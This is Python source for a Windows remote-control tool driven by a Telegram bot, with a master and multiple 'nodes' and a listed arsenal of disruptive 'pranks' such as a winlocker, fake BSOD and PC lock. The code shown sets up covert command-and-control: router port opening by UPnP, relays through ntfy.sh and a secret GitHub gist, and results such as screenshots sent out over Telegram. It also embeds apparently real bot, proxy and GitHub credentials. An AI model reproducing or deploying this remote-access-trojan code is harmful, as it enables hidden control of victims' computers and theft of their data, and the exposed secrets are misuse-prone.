# language: Python 3.11+, file: 12.py, target: Windows
# личный пульт v7 — мастер/ноды: один токен, много машин
# каркас/меню/прокси/качалка + АРСЕНАЛ приколов
# сеть: весь трафик бота и качалки через socks5
# РЕЖИМЫ: обычный запуск = МАСТЕР (бот + TCP-сервер для нод на ports RPC_PORT=7731)
#         python main.py --node IP_мастера:7731 [имя] = НОДА (стучится к мастеру,
#         команды от панели едут ей по сети; себе мастер исполняет локально)
# появились: список хостов 🟢/⚪️ + ✅ выбранного, предложение подключиться
#            к новому хосту, кнопки ♻️ Автозапуск ВКЛ/ВЫКЛ для пульта (не для вирусов)
# приколы: БСОД, фейк-апдейт, рикролл, наизнанку, блэк-аут, экран выкл, поворот,
#          фликер, танец окна, флуд cmd, окон-бомба, мышь (пьяная/центр/углы/клетка/swap),
#          CDROM, значки, обои (фото / скриншот / «Я ВСЁ ВИЖУ» / вернуть), блокноты,
#          мелодия, сирена, голос, громкость MAX, caps, плеер, WINLOCKER,
#          театр format C:, хакер, заряд 1%, скример, блок ПК, сарказм ×5,
#          конец света, СУДНАЯ НОЧЬ 2.0, Ctrl+Alt+Del прятки, UAC — всё тумблерами
# установка: pip install "python-telegram-bot[socks]>=21" pillow
# данные (токен/айди/прокси/адрес ноды) ВСЕ ВШИТЫ В КОД — никаких .cfg файлов
import io, os, sys, html, socket, contextlib, datetime, subprocess, logging, asyncio, random, threading, time, json, base64, hashlib, re
import webbrowser, urllib.request, winreg, ctypes, uuid
from concurrent.futures import ThreadPoolExecutor
from ctypes import wintypes
from pathlib import Path
from urllib.parse import urlparse, urljoin
import httpx
from PIL import ImageGrab, Image, ImageOps, ImageDraw, ImageFont
from PIL import ImageTk  # noqa: F401  (нужен для tk-оверлеев внутри прикалов)
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

# ОДИН РАБОЧИЙ ФАЙЛ: ВСЕ данные вшиты в код, никаких .cfg вообще.
# если когда-нибудь сменишь токен/айди/прокси — правь эти три строки ниже.
BOT_TOKEN  = "8669253902:AAE7nf8J9TqyT597EwsZyosmRHNRuQKoMyI"
PROXY_URL  = "socks5://proxy_user:sP3HL0BCEJtfTdVq@194.87.55.223:42391"   # пусто = напрямую
ALLOWED_IDS: set[int] = {7352010946, 1885696985}
DATA_DIR = Path(os.environ.get("LOCALAPPDATA", ".")) / "TelegramBot"
DATA_DIR.mkdir(exist_ok=True)

pending: dict[int, str] = {}
flood_stop: set[int] = set()
pranks_running: dict[str, bool] = {}

# ---------- выбор хоста: панель ОДНА, смена хоста внутри панели ----------
# /start сразу открывает ПАНЕЛЬ с уже выбранным хостом — никакого отдельного
# экрана выбора. тап «🛰 Сменить хоста» ПРАВИТ ту же панель в список хостов,
# тап по хосту правит её обратно в меню — сообщение всегда одно.
# СИСТЕМА ХОСТОВ: один и тот же код на всех машинах:
#   * просто запусти (py main.py) → пробует стать МАСТЕРОМ (бот + TCP+UDP сервер);
#   * если токен занят другим пультом (409) → сам становится НОДОЙ и САМА находит
#     мастера: LAN-бренч (одна сеть) → ntfy-резюме (другие сети); NODE_ADDR в коде —
#     ручной запас, если оба авто-пути не сработали (мастер за NAT без проброса).
# нода стучится к мастеру, мастер показывает список 🟢/⚪️ и ✅ на выбранном,
# при НОВОМ подключении бот присылает предложение подключиться к новому хосту.
# команды уходят выбранному хосту по сети; себе — выполняются локально.
# имя машины: случайное, запомнено в реестре; HOST_TITLES — красивые подписи.
HOST_TITLES: dict[str, str] = {
    # "имя машины": "подпись в меню",
}

# ---------- случайные имена хостов (память в РЕЕСТРЕ, никаких файлов) ----------
# машина один раз получает РАНДОМНОЕ имя («хитрый_таракан_7»), запоминает его
# в HKCU\Software\Surios и дальше живёт постоянно. HOST_TITLES — подписи для красоты.
_NAME_ADJ = ("пьяный", "хитрый", "жирный", "мокрый", "колючий", "лысый", "быстрый",
             "наглый", "грустный", "шустрый", "счастливый", "волосатый", "сонный")
_NAME_NOUN = ("таракан", "кактус", "огурец", "пельмень", "бутерброд", "кот", "дельфин",
              "енот", "капибара", "валенок", "холодильник", "кипяток", "мотылёк", "трактор")
_REG_HKEY = r"Software\Surios"

def ensure_host_name() -> str:
    try:
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, _REG_HKEY) as k:
            try:
                name = winreg.QueryValueEx(k, "HostName")[0]
                if name:
                    return str(name)
            except FileNotFoundError:
                pass
    except Exception:
        pass
    name = f"{random.choice(_NAME_ADJ)}_{random.choice(_NAME_NOUN)}_{random.randint(10, 99)}"
    try:
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, _REG_HKEY) as k:
            winreg.SetValueEx(k, "HostName", 0, winreg.REG_SZ, name)
    except Exception:
        pass
    return name

def host_label() -> str:
    return ensure_host_name() or socket.gethostname() or "хост"

def local_ip() -> str:
    """свой LAN IP (пригодится чтобы вписать в NODE_ADDR)"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

SESS: dict[str, str] = {}   # chat_id -> чей пульт открыт в этом чате (базовое имя хоста)
PANEL: dict[int, int] = {}  # chat_id -> message_id постоянной панели (всегда одно сообщение)
VIEW: dict[int, str] = {}   # chat_id -> какой экран открыт в панели ("main"/"hosts"/...)

# ---------- рантайм хостов ----------
# АДРЕС МАСТЕРА для второй машины (ноды) — ВПИШИ СЮДА ОДНУ СТРОКУ, например:
#   NODE_ADDR = "192.168.1.50:7731"     (одна сеть)
#   NODE_ADDR = "18.44.200.10:7731"     (разные сети — наружный IP мастера)
# "" = эта машина нормальна как мастер; на второй машинеProp с пустым NODE_ADDR
# будет понятная подсказка в консоли, что вписать.
NODE_ADDR = ""

MASTER_NAME = host_label()          # собственное имя этой машины
MASTER_ADDR = NODE_ADDR             # адрес мастера (знает только нода)
NODES: dict[str, dict] = {}         # ЖИВОЕ имя -> {"writer": ...} (суффикс #N при дубликатах)
SEEN_HOSTS: dict[str, dict] = {}    # базовое имя -> {"live": живое имя, "online": bool}
KNOWN_CHATS: set[int] = set()       # чаты с панелями — туда летит предложение о новом хосте
_rpc_id = 0
_pending_calls: dict[int, asyncio.Future] = {}

RPC_PORT   = 7731
RPC_SECRET = "surios-pult-v1"       # чтобы коллеги не цеплялись: поменять на любой текст

# ---------- АВТО-ПОИСК МАСТЕРА (ни одной ручной строки) ----------
# 1) одна сеть: нода бренчит UDP «SURIOS-DISCOVER», мастер отвечает адресом;
# 2) другие сети: мастер раз в 10 минут публикует резюме (LAN-IP + внешний IP)
#    в ntfy.sh; ключ темы = md5(токен+секрет) — токен и секрет и так в коде
#    ОБЕИХ машин, поэтому нода находит тему без настроек.
DISC_PORT   = 7732
_NTFY_EVERY = 600.0
_HTTP: httpx.AsyncClient | None = None      # прокси (Telegram и всё, что им разговорчиво)
_NTFY: httpx.AsyncClient | None = None      # прямой в ntfy.sh (прокси ntfy душит)

def _http() -> httpx.AsyncClient:
    global _HTTP
    if _HTTP is None or _HTTP.is_closed:
        try:
            _HTTP = httpx.AsyncClient(proxy=PROXY_URL, timeout=20.0)
        except Exception:
            _HTTP = httpx.AsyncClient(proxies=PROXY_URL, timeout=20.0)   # старый httpx
    return _HTTP

def _ntfy_cli() -> httpx.AsyncClient:
    global _NTFY
    if _NTFY is None or _NTFY.is_closed:
        _NTFY = httpx.AsyncClient(timeout=45.0)     # ноги свои: никаких прокси
    return _NTFY

async def _ntfy_req(method: str, url: str, *, headers=None, params=None,
                    data=None, content=None, timeout: float = 45.0):
    """ntfy-запрос: сперва напрямую; прокси — запаслася вторая нога"""
    last = None
    for cli in (_ntfy_cli(), _http()):
        try:
            return await cli.request(method, url, headers=headers, params=params,
                                     data=data, content=content,
                                     timeout=timeout, follow_redirects=True)
        except Exception as e:
            last = e
    raise last

def _ntfy_topic(kind: str = "") -> str:
    t = "surios-" + hashlib.md5((BOT_TOKEN + RPC_SECRET).encode("utf-8")).hexdigest()[:16]
    return t + (("-" + kind) if kind else "")

async def _ntfy_publish_loop():
    """мастер: раз в 10 минут кладу свежее резюме адресов в ntfy — ноды из других сетей найдут"""
    topic = _ntfy_topic()
    while True:
        mapped = str(_UPNP_STATE.get("mapped") or "")     # UPnP-адрес надёжнее голого ipify
        ext = mapped
        if not ext:
            try:
                r = await _http().get("https://api.ipify.org")
                if r.status_code == 200:
                    ext = r.text.strip()[:64] + f":{RPC_PORT}"
            except Exception:
                ext = ""
        payload = {"t": "master", "secret": RPC_SECRET,
                   "local": f"{local_ip()}:{RPC_PORT}",
                   "ext": (ext if ext else "")}
        try:
            await _http().post(f"https://ntfy.sh/{topic}", data=json.dumps(payload).encode("utf-8"),
                               headers={"Title": "surios-master", "Priority": "low"})
        except Exception:
            pass
        await asyncio.sleep(_NTFY_EVERY)

async def _ntfy_pull_candidates() -> list[str]:
    """нода: свежие резюме мастера из кэша ntfy (внутри LAN-адрес и внешний)"""
    try:
        r = await _http().get(f"https://ntfy.sh/{_ntfy_topic()}/json",
                              params={"poll": "1", "since": f"{int(_NTFY_EVERY * 3)}s"})
        if r.status_code != 200:
            return []
        out: list[str] = []
        for line in reversed(r.text.splitlines()):          # самое свежее сверху
            try:
                ev = json.loads(line)
                pays = json.loads(ev.get("message") or "")
            except Exception:
                continue
            if pays.get("t") != "master" or pays.get("secret") != RPC_SECRET:
                continue
            for k in ("local", "ext"):
                a = str(pays.get(k) or "")
                if a and a not in out:
                    out.append(a)
        return out
    except Exception:
        return []

async def _disc_server():
    """мастер: отвечаю на UDP-бренчи нод адресом своего TCP-сервера"""
    loop = asyncio.get_running_loop()
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.setblocking(False)
        s.bind(("", DISC_PORT))
        reply = json.dumps({"t": "master", "secret": RPC_SECRET,
                            "addr": f"{local_ip()}:{RPC_PORT}"}).encode("utf-8")
        while True:
            data, peer = await loop.sock_recvfrom(s, 512)
            if data.startswith(b"SURIOS-DISCOVER"):
                with contextlib.suppress(Exception):
                    await loop.sock_sendto(s, reply, peer)

async def _disc_scan(timeout: float = 3.0) -> list[str]:
    """нода: бренчу в сеть и собираю ответы мастеров"""
    loop = asyncio.get_running_loop()
    out: list[str] = []
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        s.setblocking(False)
        with contextlib.suppress(Exception):
            await loop.sock_sendto(s, b"SURIOS-DISCOVER", ("255.255.255.255", DISC_PORT))
        deadline = loop.time() + timeout
        while len(out) < 4:
            remain = deadline - loop.time()
            if remain <= 0:
                break
            try:
                data, _peer = await asyncio.wait_for(loop.sock_recvfrom(s, 2048), remain)
                pays = json.loads(data.decode("utf-8", "replace"))
                if pays.get("t") == "master" and pays.get("secret") == RPC_SECRET and pays.get("addr"):
                    a = str(pays["addr"])
                    if a not in out:
                        out.append(a)
            except asyncio.TimeoutError:
                break
            except Exception:
                continue
    return out

# ---------- UPnP: мастер сам открывает порт 7731 на своём роутере ----------
# нода из ДРУГОЙ страны не может достучаться до 192.168.x.x — поэтому мастер
# прошивает свой роутер по UPnP (SSDP → SOAP AddPortMapping, lease 30 мин,
# обновляется по кругу) и публикует внешний адрес в ntfy-резюме.
_UPNP_STATE: dict[str, str] = {"mapped": ""}      # внешний «IP:порт», если mapping удался
UPNP_POOL = ThreadPoolExecutor(max_workers=1, thread_name_prefix="upnp")

def _upnp_soap(svc: str, action: str, ext_port: int, ip: str, int_port: int, lease: int) -> str:
    return (f'<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"'
            f' s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body>'
            f'<u:{action} xmlns:u="{svc}">'
            f"<NewRemoteHost></NewRemoteHost>"
            f"<NewExternalPort>{ext_port}</NewExternalPort>"
            f"<NewProtocol>TCP</NewProtocol>"
            f"<NewInternalPort>{int_port}</NewInternalPort>"
            f"<NewInternalClient>{ip}</NewInternalClient>"
            f"<NewEnabled>1</NewEnabled>"
            f"<NewPortMappingDescription>surios-pult</NewPortMappingDescription>"
            f"<NewLeaseDuration>{lease}</NewLeaseDuration>"
            f"</u:{action}></s:Body></s:Envelope>")

def _upnp_map_sync(lease: int = 1800) -> str | None:
    """SSDP-поиск роутера → AddPortMapping → «внешний_ip:порт» (или None)"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        s.settimeout(2.0)
        for st in ("urn:schemas-upnp-org:device:InternetGatewayDevice:1",
                   "urn:schemas-upnp-org:service:WANIPConnection:1", "ssdp:all"):
            with contextlib.suppress(Exception):
                s.sendto((f"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
                          f'MAN: "ssdp:discover"\r\nMX: 1\r\nST: {st}\r\n\r\n').encode("utf-8"),
                         ("239.255.255.250", 1900))
        loc = None
        deadline = time.time() + 4.0
        while time.time() < deadline and not loc:
            try:
                data, _ = s.recvfrom(8192)
            except socket.timeout:
                break
            for line in data.decode("utf-8", "replace").splitlines():
                if line.lower().startswith("location:"):
                    loc = line.split(":", 1)[1].strip()
                    break
        s.close()
        if not loc:
            return None
        desc = httpx.get(loc, timeout=8.0).text
        ctl = svc = None
        for m in re.finditer(r"<service>(.*?)</service>", desc, re.S):
            blk = m.group(1)
            t = re.search(r"<serviceType>([^<]+)</serviceType>", blk)
            u = re.search(r"<controlURL>([^<]+)</controlURL>", blk)
            if t and u and ("WANIPConnection" in t.group(1) or "WANPPPConnection" in t.group(1)):
                ctl, svc = u.group(1).strip(), t.group(1).strip()
                break
        if not ctl:
            return None
        ext_ip = ""
        im = re.search(r"<externalIPAddress>([^<]+)</externalIPAddress>", desc)
        if im:
            ext_ip = im.group(1).strip()
        target = urljoin(loc, ctl)
        for ext_port in (RPC_PORT, RPC_PORT + 1, RPC_PORT + 2, RPC_PORT + 3, RPC_PORT + 5):
            body = _upnp_soap(svc, "AddPortMapping", ext_port, local_ip(), RPC_PORT, lease)
            r = httpx.post(target, data=body.encode("utf-8"), headers={
                "Content-Type": "text/xml; charset=utf-8",
                "SOAPACTION": f'"{svc}#AddPortMapping"'}, timeout=8.0)
            t = r.text
            if r.status_code == 200:
                if ext_ip and ext_ip != local_ip():
                    _UPNP_STATE["mapped"] = f"{ext_ip}:{ext_port}"
                    return _UPNP_STATE["mapped"]
            if "725" in t or "OnlyPermanentLeases" in t:
                lease = 0      # роутер умеет только вечные маппинги — ладно
        return None
    except Exception:
        return None

async def _upnp_forward_loop():
    """прошиваю роутер раз в 5 минут (lease гаснут), результат в ntfy-резюме"""
    said = False
    while True:
        try:
            res = await asyncio.wait_for(
                asyncio.get_running_loop().run_in_executor(UPNP_POOL, _upnp_map_sync), 90)
            if res and not said:
                print(f"[мастер] UPnP: порт проброшен наружу → {res}\n"
                      "        ноды из других стран найдут его сами (адрес летит в ntfy-резюме)")
            elif not res and not said:
                print(f"[мастер] UPnP: роутер не отдал порт. проверь UPnP в настройках роутера,\n"
                      f"        или пробрось порт {RPC_PORT} вручную (нода из другой сети без него не зайдёт)")
            said = True
        except Exception:
            pass
        await asyncio.sleep(300.0)

# ---------- ЗАПАСНОЙ ТРАНСПОРТ: релей через ntfy ----------
# TCP мастеру нужен открытый входящий порт; если роутер без UPnP — нода из другой
# страны живёт через ntfy: обе стороны ходят ТОЛЬКО наружу. команды мастер публикует
# в.topic -cmd (с «to»: имя ноды), нода отвечает в тему -res; большие ответы (скрины)
# — вложением POST + Filename, мелкие — телом сообщения.

def _ntfy_cmd_url() -> str:
    return f"https://ntfy.sh/{_ntfy_topic('cmd')}"

def _ntfy_res_url() -> str:
    return f"https://ntfy.sh/{_ntfy_topic('res')}"

async def _ntfy_poll_events(url: str, since: str) -> tuple[list[dict], str]:
    """один глоток JSON-ленты темы; возвращает (события, свежий since)"""
    jurl = url if url.endswith("/json") else url + "/json"
    r = await _ntfy_req("GET", jurl, params={"poll": "1", "since": since, "timeout": "45"}, timeout=60.0)
    out: list[dict] = []
    new_since = since
    if r.status_code == 200:
        for line in r.text.splitlines():
            if not line.strip():
                continue
            try:
                ev = json.loads(line)
            except Exception:
                continue
            if ev.get("id"):
                new_since = str(ev["id"])
            if ev.get("event") == "message":
                out.append(ev)
    return out, new_since

def _ntfy_msg(obj: dict) -> bytes:
    return json.dumps(obj, ensure_ascii=False).encode("utf-8")

async def _ntfy_fetch_att(u: str, cap: int = 24 * 1024 * 1024) -> dict:
    """забор содержимого вложения (JSON)"""
    try:
        r = await _ntfy_req("GET", u, timeout=60)
        if r.status_code == 200:
            return json.loads(r.content[:cap].decode("utf-8", "replace"))
    except Exception:
        pass
    return {}

async def _ntfy_publish(url: str, obj: dict, title: str = "surios"):
    await _ntfy_req("POST", url, data=_ntfy_msg(obj),
                    headers={"Title": title, "Priority": "low"}, timeout=20)

async def _ntfy_publish_att(url: str, name: str, data: bytes, title: str = "surios") -> str:
    """большой кусок как вложение; возвращает URL вложения (или '')"""
    r = await _ntfy_req("POST", url, data=data, headers={"Filename": name, "Title": title}, timeout=60)
    u = ""
    if r.status_code == 200:
        try:
            u = str((r.json().get("attachment") or {}).get("url") or "")
        except Exception:
            u = ""
    return u

def _ntfy_side_parse(ev: dict) -> dict:
    """событие ленты -> payloadды"""
    try:
        pays = json.loads(ev.get("message") or "{}")
    except Exception:
        return {}
    return pays

# ---------- РЕЛЕЙ ЧЕРЕЗ GITHUB (gist): транспорт без открытых портов ----------
# Идея: у обоих экземпляров main.py один токен на телегу и один ПАТ на GitHub.
# мастер:                                                              → gist:
#   создаёт СЕКРЕТНЫЙ gist, пишет его id в addr.json репы (1 коммит);
#   команды кладёт в q.json (PATCH, без коммитов), ответы берёт из a.json,
#   heartbeat нод — live.json (нода патчит каждые 20с, мастер считает
#   живой ±80с). Большой ответ (скрин/вебка) нода правляет ТЕЛЕГРАМ-документом
#   в чат одного из ALLOWED — мастер получает его как обычный апдейт.
GH_TOKEN = "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"
GH_REPO  = "NoRat-1v/Sirius"
_RELAY: dict = {"gid": "", "seen": set(), "pending": {}, "dirty": False}
_GH: httpx.AsyncClient | None = None

def _gh_cli() -> httpx.AsyncClient:
    global _GH
    if _GH is None or _GH.is_closed:
        _GH = httpx.AsyncClient(timeout=40.0)     # к github — своими ногами
    return _GH

def _gh_headers(extra: dict | None = None) -> dict:
    hh = {"Authorization": f"Bearer {GH_TOKEN}",
          "Accept": "application/vnd.github+json",
          "User-Agent": "surios-relay",
          "X-GitHub-Api-Version": "2022-11-28"}
    if extra:
        hh.update(extra)
    return hh

async def _gh_req(method: str, path: str, *, params=None, json_data=None, data=None,
                  headers: dict | None = None, timeout: float = 40.0, raw_url: str = ""):
    """сначала напрямую к api/; прокси — запасная нога, если свет секут"""
    url = raw_url or (path if path.startswith("http") else f"https://api.github.com{path}")
    last = None
    for cli in (_gh_cli(), _http()):
        try:
            return await cli.request(method, url, params=params, json=json_data, data=data,
                                     headers=_gh_headers(headers), timeout=timeout,
                                     follow_redirects=True)
        except Exception as e:
            last = e
    raise last

def _rel_j(obj) -> bytes:
    return json.dumps(obj, ensure_ascii=False).encode("utf-8")

async def _gh_repo_file(name: str):
    """свежий файл из репы мимо raw-CDN (Accept raw), фолбек — raw с cache-bust"""
    try:
        r = await _gh_req("GET", f"/repos/{GH_REPO}/contents/{name}",
                          headers={"Accept": "application/vnd.github.raw"}, timeout=30)
        if r.status_code == 200:
            try:
                return json.loads(r.text)
            except Exception:
                return None
    except Exception:
        pass
    try:
        u = f"https://raw.githubusercontent.com/{GH_REPO}/main/{name}"
        r = await _gh_req("GET", raw_url=u, params={"t": int(time.time())}, timeout=30)
        if r.status_code == 200:
            return json.loads(r.text)
    except Exception:
        pass
    return None

async def _gh_put_file(name: str, data: bytes) -> bool:
    """обновляю файл в репе; коммит ТОЛЬКО если содержимое реально поменялось"""
    try:
        g = await _gh_req("GET", f"/repos/{GH_REPO}/contents/{name}", timeout=30)
        if g.status_code == 200:
            body = g.json() or {}
            with contextlib.suppress(Exception):
                if base64.b64decode(str(body.get("content") or "")) == data:
                    return True
            payload = {"message": f"surios: {name}", "branch": "main",
                       "content": base64.b64encode(data).decode("ascii"),
                       "sha": body.get("sha")}
        elif g.status_code == 404:
            payload = {"message": f"surios: {name}", "branch": "main",
                       "content": base64.b64encode(data).decode("ascii")}
        else:
            return False
        p = await _gh_req("PUT", f"/repos/{GH_REPO}/contents/{name}",
                          json_data=payload, timeout=60)
        return p.status_code in (200, 201)
    except Exception:
        return False

def _gist_files(r) -> dict:
    files = (r.json() or {}).get("files") or {}
    out: dict = {}
    for fn, meta in files.items():
        with contextlib.suppress(Exception):
            out[fn] = json.loads(str(meta.get("content") or "null"))
    return out

async def _gist_get(gid: str) -> dict:
    try:
        r = await _gh_req("GET", f"/gists/{gid}", timeout=40)
        if r.status_code == 200:
            return _gist_files(r)
    except Exception:
        pass
    return {}

async def _gist_patch(gid: str, files: dict) -> dict:
    try:
        r = await _gh_req("PATCH", f"/gists/{gid}", json_data={"files": files}, timeout=60)
        if r.status_code == 200:
            return _gist_files(r)
    except Exception:
        pass
    return {}

async def _relay_setup_master(app) -> str:
    """gid: берём из addr.json репы, если gist жив; иначе создаём новый и пишем резюме"""
    addr = await _gh_repo_file("addr.json") or {}
    gid = str(addr.get("gid") or "") or str(_RELAY.get("gid") or "")
    if gid and "q.json" not in await _gist_get(gid):
        gid = ""                                  # gist сдох — заводим свежий
    if not gid:
        r = await _gh_req("POST", "/gists", json_data={
            "description": f"surios relay · {MASTER_NAME}", "public": False,
            "files": {"q.json": {"content": _rel_j({"t": int(time.time()), "q": []}).decode("utf-8")},
                      "a.json": {"content": _rel_j({"t": 0, "a": []}).decode("utf-8")},
                      "live.json": {"content": _rel_j({"t": 0, "name": ""}).decode("utf-8")}}}, timeout=60)
        gid = str((r.json() or {}).get("id") or "") if r.status_code in (200, 201) else ""
    _RELAY["gid"] = gid
    ext = ""
    try:
        rr = await _http().get("https://api.ipify.org", timeout=15)
        ext = rr.text.strip()[:64] if rr.status_code == 200 else ""
    except Exception:
        ext = ""
    mapped = str(_UPNP_STATE.get("mapped") or "")
    resume = dict(addr or {})
    resume.update({"dsc": "surios addr resume", "secret": RPC_SECRET, "gid": gid,
                   "name": MASTER_NAME, "t": int(time.time()),
                   "local": f"{local_ip()}:{RPC_PORT}",
                   "ext": (mapped or (f"{ext}:{RPC_PORT}" if ext else ""))})
    await _gh_put_file("addr.json", _rel_j(resume))
    return gid

async def _gh_push_q(gid: str) -> bool:
    """мастер единолично владеет q.json: туда весь мой pending"""
    pend: list[dict] = []
    for lst in _RELAY["pending"].values():
        pend.extend(lst)
    files = await _gist_patch(gid, {"q.json": {"content": _rel_j(
        {"t": int(time.time()), "q": pend}).decode("utf-8")}})
    return bool(files)

async def _relay_master_gh(app):
    """мастер следит за gist: heartbeat нод, ответы, чистка q.json"""
    gid = await _relay_setup_master(app)
    if not gid:
        print("❌ GitHub-релей не встал (токен/сеть) — relay-ноды останутся только на LAN/NODE_ADDR")
        return
    print(f"→ GitHub-релей готов (gist {gid[:8]}…): нода из другой страны подключится сама")
    await _gh_push_q(gid)
    while True:
        try:
            files = await _gist_get(gid)
            live = files.get("live.json") or {}
            name = str(live.get("name") or "")[:48]
            t_live = int(live.get("t") or 0)
            now = int(time.time())
            if name and name != MASTER_NAME:
                st = SEEN_HOSTS.setdefault(name, {"live": name})
                fresh = bool(t_live) and (now - t_live) <= 80
                if fresh and not st.get("online"):
                    st.update({"live": name, "online": True, "via": True, "last_seen": t_live})
                    with contextlib.suppress(Exception):
                        await host_event(app, name, True)
                elif (not fresh) and st.get("via") and st.get("online"):
                    st.update({"online": False, "last_seen": 0})
                    with contextlib.suppress(Exception):
                        await host_event(app, name, False)
            for res in ((files.get("a.json") or {}).get("a") or []):
                rid = res.get("id")
                if not rid or rid in _RELAY["seen"]:
                    continue
                _RELAY["seen"].add(rid)
                if len(_RELAY["seen"]) > 1024:
                    _RELAY["seen"].clear()
                fut = _pending_calls.pop(rid, None)
                if fut and not fut.done():
                    fut.set_result({k: v for k, v in res.items() if k != "secret"})
            if _RELAY.pop("dirty", False):
                await _gh_push_q(gid)
        except Exception:
            pass
        await asyncio.sleep(4.0)

async def _relay_send(name: str, cmd: dict, timeout: float = 300.0) -> dict:
    """команда relay-ноде через gist; ответ ждём future'ом с a.json/TG-документа"""
    gid = str(_RELAY.get("gid") or "")
    if not gid:
        return {"t": "err", "text": "релей не активирован (gist не создался)"}
    rid = _next_id()
    if len(_rel_j(cmd)) > 480_000:
        return {"t": "err", "text": "релей не потянет такие данные — нужен TCP (UPnP/проброс)"}
    fut = asyncio.get_running_loop().create_future()
    _pending_calls[rid] = fut
    msg = dict(cmd, t="req", id=rid, secret=RPC_SECRET, to=name)
    _RELAY["pending"].setdefault(name, []).append(msg)
    _RELAY["dirty"] = True
    await _gh_push_q(gid)
    try:
        return await asyncio.wait_for(fut, timeout)
    except asyncio.TimeoutError:
        return {"t": "err", "text": f"⏳ {html.escape(name)} молчит {int(timeout)}с (релей GitHub)"}
    except Exception as e:
        return {"t": "err", "text": f"❌ релей хрупнул: {html.escape(str(e))}"}
    finally:
        _pending_calls.pop(rid, None)
        _RELAY["pending"][name] = [m for m in (_RELAY["pending"].get(name) or [])
                                   if m.get("id") != rid]
        _RELAY["dirty"] = True

async def _relay_node_gh(host_n: str):
    """нода без TCP: PATPAT live.json (и его же ответ даёт q.json) + исполнение"""
    seen: set[str] = set()
    while True:
        gid = str(_RELAY.get("gid") or "")
        if not gid:
            addr = await _gh_repo_file("addr.json") or {}
            gid = str(addr.get("gid") or "")
            if not gid:
                await asyncio.sleep(15)
                continue
            _RELAY["gid"] = gid
        try:
            files = await _gist_patch(gid, {"live.json": {"content": _rel_j(
                {"t": int(time.time()), "name": host_n}).decode("utf-8")}})
            q = (files or {}).get("q.json") or {}
            jobs: list[tuple] = []
            for item in (q.get("q") or []):
                if str(item.get("to") or "") != host_n or item.get("secret") != RPC_SECRET:
                    continue
                rid = item.get("id")
                if not rid or rid in seen:
                    continue
                seen.add(rid)
                if len(seen) > 1024:
                    seen.clear()
                cmd = {k: v for k, v in item.items() if k not in ("t", "id", "secret", "to")}
                jobs.append((rid, cmd))
            outs: list[dict] = []
            for rid, cmd in jobs:
                if cmd.get("cmd") == "flood":
                    asyncio.create_task(_node_flood(cmd.get("job") or "floodcmd"))
                    res = {"t": "res", "text": "🌀 летит"}
                else:
                    try:
                        res = await asyncio.wait_for(
                            asyncio.get_running_loop().run_in_executor(POOL, local_exec, cmd),
                            timeout=900)
                    except Exception as e:
                        res = {"t": "err", "text": f"❌ нода споткнулась: {html.escape(str(e))}"}
                blob = dict(res, t="res", id=rid, secret=RPC_SECRET)
                raw = _rel_j(blob)
                if len(raw) <= 900_000:
                    outs.append(blob)
                else:
                    outs.append({"t": "res", "id": rid, "secret": RPC_SECRET, "tg": 1})
                    asyncio.create_task(_relay_res_telegram(gid, rid, raw))
            if outs:
                await _gist_patch(gid, {"a.json": {"content": _rel_j(
                    {"t": int(time.time()), "a": outs}).decode("utf-8")}})
        except Exception:
            await asyncio.sleep(8.0)
        await asyncio.sleep(20.0)

async def _relay_res_telegram(gid: str, rid, raw: bytes):
    """ответ не влез в a.json (gist 1MB) — вешаю ТЕЛЕГРАМ-документом в чат
    одного из ALLOWED (мастер получает его как обычное сообщение)"""
    ridinfo = {"t": "ref", "id": rid, "secret": RPC_SECRET, "fn": f"res-{rid}.json"}
    try:
        chat = next(iter(ALLOWED_IDS))
        r = await _http().post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
            data={"chat_id": str(chat), "caption": _rel_j(ridinfo).decode("utf-8")[:900]},
            files={"document": (f"res-{rid}.json", raw, "application/json")},
            timeout=120)
        if r.status_code not in (200, 201):
            raise RuntimeError(r.text[:200])
    except Exception:
        with contextlib.suppress(Exception):        # испробую подмести в a.json куском
            await _gist_patch(gid, {"a.json": {"content": _rel_j(
                {"t": int(time.time()), "a": [{"t": "res", "id": rid, "secret": RPC_SECRET,
                                               "text": "❌ ответ слишком жирный"}]}).decode("utf-8")}})






RESCUE_POOL = ThreadPoolExecutor(max_workers=1, thread_name_prefix="rescue")

# отдельный пул: tk/модалки могут висеть подолгу — основной asyncio не трогаем
POOL = ThreadPoolExecutor(max_workers=4, thread_name_prefix="prank")

JOKES = [
    ("🥃", "Программист ставит на тумбочку два стакана: полный — если захочет пить ночью, и пустой — если не захочет."),
    ("🎃", "Почему программисты путают Хэллоуин и Рождество? Потому что OCT 31 == DEC 25."),
    ("🍺", "Заходит программист в бар. Бармен: «Что будете?» — «Ничего. У меня всё висит, самому разбираться надо.»"),
    ("🩹", "Учёные выяснили: 99% программистов испытывают боль, читая чужой код. Оставшийся 1% — те, кто его написал."),
    ("💾", "Windows напоминает: жизнь может закончиться раньше, чем вы сохраните файл."),
    ("🧪", "— Как называется программа, которую ни разу не тестировали? — «Готовая к релизу»."),
    ("🔗", "— У тебя есть знакомый программист? — Да, он мне даже прямую ссылку скидывал!"),
    ("🐛", "Настоящий программист считает, что задачи в мире бывают только двух видов: тривиальные и невозможные."),
    ("📅", "— Сколько времени займёт эта задача? — Две недели. — А если я помогу? — Четыре недели."),
]

def allowed(update) -> bool:
    u = update.effective_user
    return bool(u) and u.id in ALLOWED_IDS

# ---------- меню ----------
